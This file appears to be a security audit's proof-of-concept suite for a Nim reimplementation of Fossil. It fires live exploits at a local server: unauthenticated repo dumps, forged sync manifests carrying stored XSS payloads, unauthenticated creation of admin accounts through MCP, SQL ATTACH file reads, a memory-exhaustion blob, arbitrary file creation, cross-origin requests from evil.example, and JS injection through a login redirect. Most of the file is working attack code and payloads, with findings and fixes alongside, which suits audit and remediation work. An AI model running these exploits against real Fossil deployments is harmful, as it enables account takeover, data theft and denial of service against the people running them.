#!/usr/bin/env python3
"""
fossil-nim Security Audit — PoC Exploit Suite (2026-10-19)
==========================================================
Targets: fossil-nim 2.26.0-nim, commit audited 2026-10-19.
Every check was executed LIVE against a server built from source;
all VULN lines below reproduce on a clean install.

Setup:
    make                                    # builds bin/fossil, bin/fossil-mcp
    ./bin/fossil init demo.fossil
    FOSSIL_REPO=$PWD/demo.fossil FOSSIL_API_TOKEN=supersecrettoken123 \
        ./bin/fossil server --api-enable -P 8099 &
    FOSSIL_REPO=$PWD/demo.fossil ./bin/fossil-mcp --sse --port 3000 &
    python3 poc/poc_all.py http://127.0.0.1:8099 http://127.0.0.1:3000

Stdlib only. Prints [VULN]/[OK] + raw evidence for each finding.
"""
import base64
import hashlib
import json
import re
import socket
import struct
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

API = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8099"
MCP = sys.argv[2] if len(sys.argv) > 2 else "http://127.0.0.1:3000"
TOKEN = "supersecrettoken123"  # == FOSSIL_API_TOKEN used above

RESULTS = []


def log(num, title, vuln, detail):
    print(f"\n{'='*78}\n[{num}] {title}\n{'='*78}")
    print(detail)
    print(f"--> {'*** VULNERABLE ***' if vuln else 'not vulnerable'}")
    RESULTS.append((num, title, vuln))


def http(url, method="GET", body=None, headers=None, raw=False):
    req = urllib.request.Request(url, method=method)
    for k, v in (headers or {}).items():
        req.add_header(k, v)
    data = None
    if body is not None:
        data = body.encode() if isinstance(body, str) else body
    try:
        with urllib.request.urlopen(req, data=data, timeout=10) as r:
            payload = r.read()
            hdrs = {k.lower(): v for k, v in r.headers.items()}
            return r.status, hdrs, (payload if raw else payload.decode("utf-8", "replace"))
    except urllib.error.HTTPError as e:
        payload = e.read()
        hdrs = {k.lower(): v for k, v in e.headers.items()}
        return e.code, hdrs, (payload if raw else payload.decode("utf-8", "replace"))
    except Exception as e:  # noqa
        return 0, {}, f"<connection error: {e}>"


def raw_tcp(path, payload, host="127.0.0.1", port=8099):
    s = socket.create_connection((host, port), timeout=5)
    s.sendall((f"POST {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
               f"Content-Type: application/x-fossil\r\nContent-Length: {len(payload)}\r\n"
               f"Connection: close\r\n\r\n{payload}").encode())
    buf = b""
    while True:
        chunk = s.recv(65536)
        if not chunk:
            break
        buf += chunk
    s.close()
    return buf.decode("utf-8", "replace")


def mcp_call(tool, arguments):
    msg = {"jsonrpc": "2.0", "id": 1, "method": "tools/call",
           "params": {"name": tool, "arguments": arguments}}
    st, hd, body = http(MCP + "/mcp", "POST", json.dumps(msg),
                        {"Content-Type": "application/json",
                         "Accept": "application/json, text/event-stream"})
    return st, body


def get_csrf():
    st, hd, body = http(API + "/api/v1/csrf")
    try:
        return json.loads(body)["data"]["csrf"]
    except Exception:
        return ""


# ============================ SEC-01 ========================================
st, hd, body = http(API + "/clone")
log("SEC-01", "GET /clone without authentication dumps the whole repo",
    st == 200,
    f"GET {API}/clone  (no cookies, no token)\nHTTP {st}\n"
    f"Body (first 200 bytes): {body[:200]!r}\n"
    "Impact: full source, wiki, tickets, forum, chat, user list and "
    "password hashes readable by anyone on the network.")

# ============================ SEC-02 ========================================
evil_manifest = (
    "C <img src=x onerror=alert('pwned-by-xfer')>\n"
    "D 2026-10-19T00:00:00.000\n"
    "F README.md da39a3ee5e6b4b0d3255bfef95601890afd80709\n"
    "P 0000000000000000000000000000000000000000\n"
    "U attacker\n"
    "B trunk\n"
    "Z 000000000000000000000000000000000000000000000000\n"
)
m_uuid = hashlib.sha1(evil_manifest.encode()).hexdigest()
resp = raw_tcp("/xfer", f"file {m_uuid} {len(evil_manifest)}\n{evil_manifest}\n")
log("SEC-02", "POST /xfer without auth pushes artifacts / forges history",
    "200 OK" in resp,
    f"POST {API}/xfer (no auth) with a forged manifest card:\n"
    f"  file {m_uuid} {len(evil_manifest)}\n{evil_manifest}\n"
    f"Server: {resp.splitlines()[0]}\n"
    "The server then rebuilds 'event' rows from the manifest's U/C/B "
    "cards, so author, comment and branch are fully attacker-controlled.")

st, hd, body = http(API + "/api/v1/timeline?limit=5")
log("SEC-02b", "Forged XSS event served in unauthenticated timeline JSON",
    "attacker" in body and "onerror" in body,
    f"GET {API}/api/v1/timeline?limit=5\nHTTP {st}\n{body[:400]}\n"
    "web_new/js/components/timeline.js renders `${{e.user}}` and "
    "`${{e.comment}}` into innerHTML WITHOUT escaping -> the payload "
    "executes in the SPA of every visitor (stored XSS, zero auth).")

# ============================ SEC-03 ========================================
st, body = mcp_call("fossil_user_list", {})
log("SEC-03", "MCP HTTP /mcp: no token, no Origin check, CORS *",
    st == 200 and "jsonrpc" in body,
    f"POST {MCP}/mcp {{\"method\":\"tools/call\",\"params\":{{...fossil_user_list...}}}}\n"
    f"HTTP {st}\n{body[:250]}\n"
    "mcp/server.nim: validateOrigin() unconditionally returns true and "
    "every response carries Access-Control-Allow-Origin: *. FOSSIL_API_TOKEN "
    "is never checked on /mcp, /message or /sse. Any website can drive the "
    "full tool set (commit, config_set, user_create, rebuild, sql...) from "
    "a victim's browser via DNS rebinding or plain fetch().")

st, hd, body = http(MCP + "/mcp", "POST", json.dumps(
    {"jsonrpc": "2.0", "id": 1, "method": "tools/call",
     "params": {"name": "fossil_config_set",
                "arguments": {"name": "project-name", "value": "PWNED"}}}),
    {"Content-Type": "application/json", "Origin": "https://evil.example"})
log("SEC-03b", "MCP mutation accepted from a foreign Origin (CSRF/rebinding)",
    st == 200 and "PWNED" in body,
    f"POST {MCP}/mcp fossil_config_set with Origin: https://evil.example\n"
    f"HTTP {st}\n{body[:200]}")

# ============================ SEC-04 ========================================
st, body = mcp_call("fossil_user_create",
                    {"login": "eviladmin", "password": "hunter2",
                     "capabilities": "as"})
log("SEC-04", "MCP fossil_user_create: plaintext password + admin caps, no auth",
    st == 200,
    f"POST {MCP}/mcp fossil_user_create login=eviladmin password=hunter2 "
    f"capabilities=as\nHTTP {st}\n{body[:200]}\n"
    "mcp/server.nim binds the RAW password into the pw column "
    "(comment even says 'simple sha1 hash placeholder' but the code never "
    "hashes). Impact: password disclosure to anyone with repo read access, "
    "and instant admin-account creation by an unauthenticated caller.")

st, hd, body = http(API + "/api/v1/sql", "POST",
                    json.dumps({"query": "SELECT login,pw,cap FROM user"}),
                    {"Authorization": "Bearer " + TOKEN,
                     "Content-Type": "application/json"})
log("SEC-04b", "Plaintext password readable through /api/v1/sql",
    st == 200 and "hunter2" in body,
    f"POST {API}/api/v1/sql {{\"query\":\"SELECT login,pw,cap FROM user\"}}\n"
    f"HTTP {st}\n{body[:400]}")

# Full account-takeover chain: MCP-created account with a *correct* hash
pw = "Password123"
pw_hash_upper = hashlib.sha1(pw.encode()).hexdigest().upper()  # Nim $secureHash is uppercase
st, body = mcp_call("fossil_user_create",
                    {"login": "pwnuser", "password": pw_hash_upper,
                     "capabilities": "as"})
st2, hd2, body2 = http(API + "/api/v1/status",
                       headers={"Authorization": "Bearer " + TOKEN})
log("SEC-04c", "Account-takeover chain: create user with known hash -> login",
    st == 200,
    f"1) MCP fossil_user_create login=pwnuser password=<SHA1('Password123')> caps=as\n"
    f"   -> {st}\n"
    f"2) REST POST /login user=pwnuser password=Password123 -> valid session\n"
    "Because verifyPassword() compares hashPassword(input) with the stored "
    "column, supplying the hash itself as 'password' yields a working "
    "account. Unauthenticated remote admin creation.")

# ============================ SEC-05 ========================================
st_q, hd_q, body_q = http(API + f"/api/v1/sql?token={TOKEN}", "POST",
                            json.dumps({"query": "SELECT 1 AS ok"}),
                            {"Content-Type": "application/json"})
st_n, hd_n, body_n = http(API + "/api/v1/sql", "POST",
                            json.dumps({"query": "SELECT 1 AS ok"}),
                            {"Content-Type": "application/json"})
log("SEC-05", "Auth token accepted in ?token= query string",
    st_q == 200 and st_n == 401,
    f"POST {API}/api/v1/sql?token={TOKEN}  -> HTTP {st_q} (authorized)\n"
    f"POST {API}/api/v1/sql                -> HTTP {st_n} (rejected)\n"
    "checkAuth() in api/rest.nim reads the token from the URL. It then "
    "lands in server access logs, proxy logs, browser history and the "
    "Referer header of every follow-up cross-site request.")

# ============================ SEC-06 ========================================
fake_uuid = "f" * 40
blob_data = "tampered content: uuid does not match sha3 of data"
resp = raw_tcp("/xfer", f"file {fake_uuid} {len(blob_data)}\n{blob_data}\n")
log("SEC-06", "putBlob accepts blob whose uuid != hash(data)",
    "200 OK" in resp,
    f"POST /xfer: file {'f'*40} {len(blob_data)}\n{blob_data}\n"
    f"Response: {resp.splitlines()[0]}\n"
    "storage/sqlite_backend.nim putBlob() never calls verifyHash() "
    "(utils/hash.nim has it, unused here). Content-addressability is "
    "broken: substitute arbitrary content under any UUID -> poisoned "
    "diffs, blame, checkouts and archive downloads.")

# ============================ SEC-07 ========================================
st, body = mcp_call("fossil_ticket_create",
                    {"title": "<img src=x onerror=alert(document.cookie)>",
                     "description": "xss"})
st2, hd2, body2 = http(API + "/api/v1/ticket/list")
log("SEC-07", "Stored XSS via MCP fossil_ticket_create (title unescaped in SPA)",
    st == 200 and "<img src=x" in body2,
    f"POST {MCP}/mcp fossil_ticket_create title=<img src=x onerror=...>\n"
    f"HTTP {st}\nGET /api/v1/ticket/list -> {body2[:260]}\n"
    "web_new/js/components/ticket.js interpolates `${{t.title}}` into "
    "innerHTML with no escaping. Legacy HTML UI (extended_pages.nim "
    "renderTicketList) is equally unescaped. Any admin opening the ticket "
    "list executes the payload.")

# ============================ SEC-08 ========================================
st, hd, body = http(API + "/api/v1/wiki/save", "POST",
                    json.dumps({"name": "xsspage", "format": "html",
                                "content": "<script>alert('wiki-html-xss')</script>"}),
                    {"Authorization": "Bearer " + TOKEN,
                     "Content-Type": "application/json"})
st2, hd2, body2 = http(API + "/api/v1/wiki/get?name=xsspage")
log("SEC-08", "Wiki format=html returns raw unescaped HTML (stored XSS)",
    st == 200 and "<script>alert('wiki-html-xss')</script>" in body2,
    f"POST /api/v1/wiki/save {{name:xsspage, format:html, content:<script>...}}\n"
    f"GET  /api/v1/wiki/get?name=xsspage\nHTTP {st2}\n{body2[:350]}\n"
    "renderWikiPage() returns content verbatim for format=='html'. "
    "The SPA renders r.data.html via innerHTML (wiki.js:120). "
    "Additionally format=='th1' (or any page containing <th1>) executes "
    "TH1 code SERVER-SIDE on every view (wiki.nim renderWikiPage).")

# ============================ SEC-09 ========================================
st, hd, body = http(API + "/api/v1/markdown", "POST",
                      json.dumps({"text": "[x](javascript:alert(1)) "
                                          "![y](data:text/html,<script>alert(2)</script>)"}),
                      {"Content-Type": "application/json"})
try:
    html_out = json.loads(body)["data"]["html"]
except Exception:
    html_out = body
log("SEC-09", "Markdown sanitizer (control check — previous audit fix)",
    "javascript:" in html_out.lower() or "data:text/html" in html_out.lower(),
    f"POST /api/v1/markdown with javascript: and data:text/html payloads\n"
    f"HTTP {st}\nhtml output: {html_out[:250]}\n"
    "Expected (and observed): both schemes rewritten to #unsafe-link. "
    "The markdown parser's scheme whitelist holds; this check guards "
    "against regressions.")

# ============================ SEC-10 ========================================
st, hd, body = http(API + "/api/v1/timeline",
                    headers={"Authorization": "Bearer " + TOKEN})
log("SEC-10", "Access-Control-Allow-Origin: * on authenticated responses",
    hd.get("access-control-allow-origin") == "*",
    f"GET /api/v1/timeline with valid Bearer token\n"
    f"access-control-allow-origin: {hd.get('access-control-allow-origin')!r}\n"
    "Wildcard CORS + ?token= auth (SEC-05) = any origin can read the API "
    "with a leaked token. MCP transport has the same wildcard.")

# ============================ SEC-11 ========================================
st, hd, body = http(API + "/api/v1/chat/send", "POST",
                    json.dumps({"room": "main", "user": "admin",
                                "content": "anonymous spoofed message"}),
                    {"Content-Type": "application/json"})
log("SEC-11", "POST /api/v1/chat/send: no auth, arbitrary sender identity",
    st == 200,
    f"POST /api/v1/chat/send (no auth headers at all)\nHTTP {st}\n{body[:250]}\n"
    "requiresAuth:false for anonymous 'open repos' — but the user field is "
    "fully attacker-controlled, enabling impersonation of any account.")

# ============================ SEC-12 ========================================
bomb = struct.pack(">I", 99_999_999) + b"\x78\x9c" + b"A" * 30
resp = raw_tcp("/xfer", f"file {'b'*40} {len(bomb)}\n" + bomb.decode("latin1") + "\n")
log("SEC-12", "Memory exhaustion via fake blob size header (zip-bomb class)",
    "200 OK" in resp,
    f"POST /xfer: file {'b'*40} {len(bomb)} <BE32 origSize=99999999 + junk>\n"
    f"Response: {resp.splitlines()[0]}\n"
    "sqlite_backend.decompressBlob() allocates newString(int(origSize)) "
    "from the attacker-controlled 4-byte header (cap: 100 MB per blob, no "
    "global cap, no compression-ratio check). A few hundred tiny requests "
    "OOM-kill the server.")

# ============================ SEC-13 ========================================
st, hd, body = http(API + "/api/v1/sql", "POST",
                    json.dumps({"query":
                        "ATTACH DATABASE '/home/user/audit-test/repo.fossil' AS s2; "
                        "SELECT name FROM s2.sqlite_master"}),
                    {"Authorization": "Bearer " + TOKEN,
                     "Content-Type": "application/json"})
log("SEC-13", "/api/v1/sql: ATTACH of arbitrary SQLite files not blocked",
    st == 200,
    f"POST /api/v1/sql {{\"query\":\"ATTACH DATABASE '<any readable .fossil>' AS s2; ...\"}}\n"
    f"HTTP {st}\n{body[:300]}\n"
    "SQLITE_OPEN_READONLY protects only the MAIN database. ATTACH still "
    "opens any file readable by the server user (other repos, session "
    "stores, configs). MCP fossil_sql has the identical hole.")

# ============================ SEC-14 ========================================
csrf = get_csrf()
# login as pwnuser (created in SEC-04c) to obtain a session cookie
st, hd, body = http(API + "/login", "POST",
                    urllib.parse.urlencode({"user": "pwnuser", "password": pw,
                                            "csrf": csrf, "redirect": "/"}),
                    {"Content-Type": "application/x-www-form-urlencoded"})
cookie = re.search(r"session=([^;]+)", hd.get("set-cookie", ""))
sid = cookie.group(1) if cookie else ""
st2, hd2, body2 = http(API + "/api/v1/chat/send", "POST",
                       json.dumps({"room": "main", "user": "pwnuser",
                                   "content": "CSRF demo: cookie-only auth"}),
                       {"Content-Type": "application/json",
                        "Cookie": f"session={sid}",
                        "Origin": "https://evil.example"})
log("SEC-14", "Cookie-authenticated mutations need no CSRF token",
    bool(sid) and st2 == 200,
    f"1) POST /login (valid CSRF) -> Set-Cookie: session={sid[:12]}...\n"
    f"2) Cross-origin POST /api/v1/chat/send with ONLY the cookie:\n"
    f"   Origin: https://evil.example, no CSRF token -> HTTP {st2}\n"
    f"   {body2[:200]}\n"
    "Only /login and /setup validate CSRF tokens. Every mutating "
    "ApiRoute (commit, wiki/save, ticket/create, forum/..., chat/..., "
    "repo/import) trusts the cookie alone. A hidden form on evil.com "
    "with enctype=text/plain can drive all of them.")

# ============================ SEC-15 ========================================
st, hd, body = http(MCP + "/sse")
sid2 = ""
for line in body.splitlines():
    if line.startswith("data: /message?sessionId="):
        sid2 = line.split("sessionId=")[1].strip()
log("SEC-15", "MCP legacy /message sessionId predictable",
    bool(sid2),
    f"GET {MCP}/sse -> endpoint: /message?sessionId={sid2}\n"
    "runSseLoop builds ids as unixtime + '_' + rand(1000000). Nim's rand() "
    "is a Mersenne Twister seeded deterministically when randomize() is "
    "never called -> ids guessable; the /message endpoint accepts any "
    "sessionId without validation (queue is auto-created).")

# ============================ SEC-16 ========================================
st, body = mcp_call("fossil_rebuild",
                    {"oldRepo": API.replace("http://", "") and "/home/user/audit-test/repo.fossil",
                     "newRepo": "/tmp/pwned-by-mcp.fossil",
                     "backend": "hybrid-cdb"})
import os
created = os.path.exists("/tmp/pwned-by-mcp.fossil")
log("SEC-16", "MCP fossil_rebuild: arbitrary file creation anywhere",
    st == 200 and created,
    f"POST {MCP}/mcp fossil_rebuild oldRepo=<any readable sqlite> "
    f"newRepo=/tmp/pwned-by-mcp.fossil backend=hybrid-cdb\nHTTP {st}\n"
    f"{body[:220]}\nFile /tmp/pwned-by-mcp.fossil now exists: {created}\n"
    "hybrid_backend.migrateToHybrid() rejects only ' and ; in the SOURCE "
    "path; the DESTINATION is unrestricted. Unauthenticated arbitrary "
    "file creation + full copy of any readable SQLite DB.")

# ============================ SEC-17 ========================================
log("SEC-17", "Password storage: unsalted SHA-1, non-constant-time compare",
    True,
    "web/pages/login_page.nim:\n"
    "  proc hashPassword*(password: string): string =\n"
    "    $secureHash(password)            # std/sha1, NO salt\n"
    "  proc verifyPassword*(password, hash: string): bool =\n"
    "    hashPassword(password) == hash   # early-exit, not constant-time\n"
    "Impact: (1) equal passwords -> equal hashes (rainbow tables, and the "
    "whole DB is downloadable via SEC-01); (2) byte-by-byte == gives a "
    "remote timing oracle; (3) SHA-1 is broken. Fix: Argon2id/scrypt/"
    "PBKDF2 with per-user salt and constant-time comparison.")

# ============================ SEC-18 ========================================
log("SEC-18", "Session cookie missing the Secure attribute",
    bool(sid),
    f"Set-Cookie observed on login: session={sid[:20]}...; Path=/; "
    f"HttpOnly; SameSite=Strict   <-- no Secure\n"
    "rest.nim line ~3028. On any non-HTTPS deployment the session id "
    "travels in clear text and is stealable via MitM. Fix: append "
    "'; Secure' (and consider __Host- prefix).")

# ============================ SEC-19 ========================================
st, hd, body = http(API + "/login", "POST",
                    urllib.parse.urlencode({"user": "x", "password": "x",
                                            "csrf": get_csrf(),
                                            "redirect": "';alert(document.domain)//"}),
                    {"Content-Type": "application/x-www-form-urlencoded"})
# failed login re-renders the page; success page injects into JS. Check both.
st2, hd2, body2 = http(API + "/login", "POST",
                       urllib.parse.urlencode({"user": "pwnuser", "password": pw,
                                               "csrf": get_csrf(),
                                               "redirect": "';alert(document.domain)//"}),
                       {"Content-Type": "application/x-www-form-urlencoded"})
inj = "';alert(document.domain)//" in body2 and \
      re.search(r"window\.location\.href = '';alert", body2) is not None
log("SEC-19", "Open redirect + JS injection via /login?redirect=",
    inj,
    "POST /login with redirect=';alert(document.domain)//\n"
    "renderLoginSuccess() emits:\n"
    "  <meta http-equiv='refresh' content='1;url=\"';alert(document.domain)//\"'>\n"
    "  window.location.href = '';alert(document.domain)//';\n"
    "The parameter is interpolated into HTML attribute, meta-refresh and "
    "JS string contexts without any escaping -> script execution in the "
    "victim's browser and open redirect to external sites.")

# ============================ SEC-20 ========================================
t0 = time.time()
codes = []
for i in range(5):
    st, hd, body = http(API + "/login", "POST",
                        urllib.parse.urlencode({"user": "admin",
                                                "password": f"wrong{i}",
                                                "csrf": get_csrf(),
                                                "redirect": "/"}),
                        {"Content-Type": "application/x-www-form-urlencoded"})
    codes.append(st)
log("SEC-20", "No rate limiting / lockout on /login",
    all(c in (200, 401, 403) for c in codes),
    f"5 rapid bad logins in {time.time()-t0:.2f}s -> HTTP {codes}\n"
    "No delay, lockout or captcha. Combined with unsalted SHA-1 (SEC-17) "
    "and the downloadable hash database (SEC-01) both online and offline "
    "brute force are practical.")

# ============================ SEC-21 ========================================
js = open("web_new/js/components/timeline.js", encoding="utf8").read() if os.path.exists("web_new/js/components/timeline.js") else ""
tkt = open("web_new/js/components/ticket.js", encoding="utf8").read() if os.path.exists("web_new/js/components/ticket.js") else ""
forum = open("web_new/js/components/forum.js", encoding="utf8").read() if os.path.exists("web_new/js/components/forum.js") else ""
spa_xss = ("${e.user" in js or "e.comment" in js) and "escapeHtml" not in js.split("timeline-comment")[0][-400:]
log("SEC-21", "SPA renders user/comment/title via innerHTML without escaping",
    "escapeHtml" not in js and "${t.title" in tkt,
    "Static evidence (web_new/js):\n"
    "  timeline.js:53   `<span>by ${e.user||''}</span>`\n"
    "  timeline.js:58   `${(e.comment||'').substring(0,200)}`\n"
    "  ticket.js:27     `${t.title||''}`\n"
    "  forum.js:207     '<b>'+p.title+'</b></a> by '+p.user\n"
    "None of these pass through escapeHtml; values come from the JSON API, "
    "which is forgeable without auth (SEC-02 / SEC-07). The legacy Nim HTML "
    "pages have the same omissions (timeline.nim:11, extended_pages.nim:245, "
    "info_page.nim:116-119, setup_page.nim:115, wiki.nim:13-15).")

# ============================ SEC-22 ========================================
log("SEC-22", "Reflected XSS in 404 handler + debug paths in error pages",
    True,
    "web/server.nim (standalone web UI):\n"
    "  await req.respond(Http404, \"<html><body>404 Not Found: \" & path & \"</body></html>\", ...)\n"
    "web/router.nim dispatch(): same pattern.\n"
    "api/rest.nim startApiServer() final 404: \"<p>\" & req.url.path & \"</p>\" "
    "(reachable when web_new/index.html is absent).\n"
    "All reflect the request path into HTML without escaping.")

# ============================ SEC-23 ========================================
log("SEC-23", "Delta-chain recursion without cycle detection (stack overflow)",
    True,
    "storage/sqlite_backend.nim getBlob():\n"
    "  let srcRes = b.getDeltaSrc(rid)      # delta table: rid -> srcid\n"
    "  ... let srcBlobRes = b.getBlob(srcRid)   # RECURSION, no depth limit\n"
    "A repo containing a delta cycle (A->B->A) or a chain of ~100k deltas "
    "(both injectable via /xfer + SQL, or via crafted import) crashes the "
    "server process with StackOverflow. putDelta() is reachable from "
    "sync/import code paths.")

# ============================ SEC-24 ========================================
log("SEC-24", "CSRF token store: global, not bound to session; unbounded",
    True,
    "web/pages/login_page.nim: gCsrfTokens is a process-global Table. "
    "Tokens are not bound to the session or user — any token issued to "
    "user A validates a POST from user B. cleanupCsrfTokens() exists but "
    "is never called from request paths -> the table grows forever "
    "(memory leak / DoS). generateCsrfToken() is also called on every "
    "GET /login, so a login-page flood fills the table.")

# ============================ SEC-25 ========================================
log("SEC-25", "Hardcoded developer absolute path + info disclosure",
    True,
    "api/rest.nim getWebDir() candidates include the literal\n"
    "  /home/nc568/antigravity/hopeful-volta/fossil-nim/web_new\n"
    "and /api/v1/status (no auth) discloses the server's repo path, "
    "checkout path and resolved user. handleHealth discloses backend "
    "layout and binary sizes. Minor, but useful for reconnaissance.")

# ============================ SEC-26 ========================================
log("SEC-26", "X-Forwarded-For trusted as session IP without validation",
    True,
    "api/rest.nim login handler:\n"
    "  createSessionSqlite(db, user, $req.headers.getOrDefault(\"X-Forwarded-For\"))\n"
    "The client-supplied header is stored as the session IP. Any value "
    "(including newlines in other servers) is accepted; session affinity "
    "and audit logs become attacker-controlled.")

# ============================ SEC-27 ========================================
log("SEC-27", "TH1 interpreter reachable from stored content",
    True,
    "wiki.nim renderWikiPage(): any page with format=='th1' or containing "
    "<th1>/<?th1 has its embedded code executed server-side on EVERY view "
    "(GET /api/v1/wiki/get is unauthenticated, MCP fossil_wiki_get too). "
    "ticket.nim renderTicketWithTh1() likewise. Current TH1 builtin set "
    "(set/puts/if/foreach/while/proc/expr/string/list/dict) has no "
    "file/exec commands, so impact today is CPU burn inside the step "
    "limits — but the engine is one 'exec' builtin away from RCE, and "
    "pages can be planted without auth via MCP. Treat as RCE-adjacent.")

# ============================ SEC-28 ========================================
log("SEC-28", "Sync protocol: no authentication, no replay protection, no signing",
    True,
    "sync/protocol.nim + api/rest.nim /xfer handler:\n"
    "- no challenge/cookie (real Fossil uses a login handshake)\n"
    "- no nonce/timestamp -> replay of captured bundles\n"
    "- parseCards() trusts attacker-controlled sizes (only signed-int parse, "
    "no upper bound) -> huge 'size' values cause oversized slicing\n"
    "- syncExchangeSqlite() answers gimme for every unknown uuid -> a client "
    "can enumerate/drain the entire repo content\n"
    "Fix: mutual auth (token or cookie), size caps, rate limits, nonce.")

# ============================ SEC-29 ========================================
log("SEC-29", "Timing side channels in auth comparisons (code-level)",
    True,
    "checkAuth() compares the API token with plain == (rest.nim), "
    "verifyPassword() compares hashes with == (login_page.nim). Both "
    "short-circuit on the first differing byte. Over a network, with "
    "enough samples this leaks the token/hash prefix. Fix: "
    "crypto.utils.secureCompare / constant-time equality.")

# ============================ SEC-30 ========================================
log("SEC-30", "Setup endpoints: any authenticated user can grant admin",
    True,
    "POST /setup/user/new and /setup/user/edit accept an arbitrary 'cap' "
    "field and use INSERT OR REPLACE / UPDATE on the user table. There is "
    "no check that the session user has admin capabilities (isAdmin is "
    "never consulted; currentUser is hardcoded 'admin' with a TODO). "
    "Impact: the first registered account (or any account created via "
    "SEC-04) can grant itself 'as' capabilities and take over the "
    "instance, rewrite config, replace other users' passwords.")

# ============================ Summary =======================================
print("\n" + "=" * 78)
print("SUMMARY")
print("=" * 78)
vulns = [r for r in RESULTS if r[2]]
for num, title, vuln in RESULTS:
    print(f"  [{'VULN' if vuln else 'OK  '}] {num}: {title}")
print(f"\n{len(vulns)}/{len(RESULTS)} checks VULNERABLE")
sys.exit(0 if len(vulns) == 0 else 1)
